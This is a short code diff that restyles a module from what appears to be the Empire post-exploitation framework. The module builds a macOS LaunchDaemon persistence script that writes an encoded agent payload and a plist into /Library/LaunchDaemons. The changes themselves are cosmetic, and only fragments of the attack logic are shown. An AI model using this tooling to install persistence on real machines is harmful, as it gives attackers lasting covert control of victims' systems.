@@ -92,7 +92,7 @@ class Module:
 
         daemonName = self.options['DaemonName']['Value']
         programname = self.options['DaemonLocation']['Value']
-        plistfilename = "%s.plist" % daemonName
+        plistfilename = f"{daemonName}.plist"
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
@@ -120,7 +120,7 @@ class Module:
 </plist>
 """ % (daemonName, programname)
 
-        script = """
+        return """
 import subprocess
 import sys
 import base64
@@ -162,6 +162,16 @@ process.communicate()
 print "\\n[+] Persistence has been installed: /Library/LaunchDaemons/%s"
 print "\\n[+] Empire daemon has been written to %s"
 
-""" % (encBytes,plistSettings, programname, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, programname)
-
-        return script
+""" % (
+            encBytes,
+            plistSettings,
+            programname,
+            plistfilename,
+            plistfilename,
+            plistfilename,
+            plistfilename,
+            plistfilename,
+            plistfilename,
+            plistfilename,
+            programname,
+        )
